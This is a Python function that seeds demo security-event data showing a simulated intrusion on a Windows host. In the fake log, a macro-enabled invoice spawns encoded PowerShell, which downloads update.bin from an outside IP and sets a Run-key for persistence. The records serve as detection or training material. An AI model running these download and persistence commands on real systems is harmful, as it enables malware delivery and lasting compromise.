from datetime import datetime, timedelta, timezone


def seed_demo_data(save_events):
    base = datetime.now(timezone.utc).replace(microsecond=0) - timedelta(minutes=25)
    host = "WIN-RESEARCH-01"
    events = [
        {"event_id":"EVT-1001","timestamp":(base).isoformat(),"source":"Security","event_type":"Logon Success","computer":host,"user_name":"suryap","process_name":"explorer.exe","command_line":"","parent_process":"winlogon.exe","process_id":"2100","logon_id":"0x9a1"},
        {"event_id":"EVT-1002","timestamp":(base+timedelta(seconds=35)).isoformat(),"source":"Sysmon","event_type":"Process Creation","computer":host,"user_name":"suryap","process_name":"WINWORD.EXE","command_line":"WINWORD.EXE C:\\Users\\suryap\\Documents\\invoice.docm","parent_process":"explorer.exe","process_id":"3180","logon_id":"0x9a1"},
        {"event_id":"EVT-1003","timestamp":(base+timedelta(minutes=1, seconds=5)).isoformat(),"source":"Sysmon","event_type":"Process Creation","computer":host,"user_name":"suryap","process_name":"powershell.exe","command_line":"powershell.exe -NoP -EncodedCommand SQBuAHYAbwBrAGUA","parent_process":"WINWORD.EXE->powershell.exe","process_id":"3292","logon_id":"0x9a1"},
        {"event_id":"EVT-1004","timestamp":(base+timedelta(minutes=1, seconds=18)).isoformat(),"source":"PowerShell","event_type":"PowerShell ScriptBlock","computer":host,"user_name":"suryap","process_name":"powershell.exe","command_line":"Invoke-WebRequest https://203.0.113.50/update.bin -OutFile C:\\ProgramData\\update.bin","parent_process":"WINWORD.EXE->powershell.exe","process_id":"3292","logon_id":"0x9a1"},
        {"event_id":"EVT-1005","timestamp":(base+timedelta(minutes=1, seconds=42)).isoformat(),"source":"Security","event_type":"Registry Modification","computer":host,"user_name":"suryap","process_name":"powershell.exe","command_line":"Set-ItemProperty","parent_process":"WINWORD.EXE->powershell.exe","registry_path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","process_id":"3292","logon_id":"0x9a1"},
        {"event_id":"EVT-1006","timestamp":(base+timedelta(minutes=2)).isoformat(),"source":"Sysmon","event_type":"Network Connection","computer":host,"user_name":"suryap","process_name":"powershell.exe","command_line":"TCP connection","destination_ip":"203.0.113.50","parent_process":"WINWORD.EXE->powershell.exe","process_id":"3292","logon_id":"0x9a1"},
        {"event_id":"EVT-1007","timestamp":(base+timedelta(minutes=3)).isoformat(),"source":"Security","event_type":"File Creation","computer":host,"user_name":"suryap","process_name":"powershell.exe","command_line":"C:\\ProgramData\\update.bin","parent_process":"WINWORD.EXE->powershell.exe","process_id":"3292","logon_id":"0x9a1"},
        {"event_id":"EVT-1008","timestamp":(base+timedelta(minutes=4)).isoformat(),"source":"Security","event_type":"Process Creation","computer":host,"user_name":"suryap","process_name":"svchost.exe","command_line":"-k netsvcs","parent_process":"services.exe","process_id":"4010","logon_id":"0x9a1"},
        {"event_id":"EVT-1009","timestamp":(base+timedelta(minutes=7)).isoformat(),"source":"Security","event_type":"Windows Defender","computer":host,"user_name":"SYSTEM","process_name":"MsMpEng.exe","command_line":"Scan completed","parent_process":"services.exe","process_id":"1280"},
        {"event_id":"EVT-1010","timestamp":(base+timedelta(minutes=12)).isoformat(),"source":"System","event_type":"Service Start","computer":host,"user_name":"SYSTEM","process_name":"svchost.exe","command_line":"Service started","parent_process":"services.exe","process_id":"4100"},
    ]
    save_events(events)
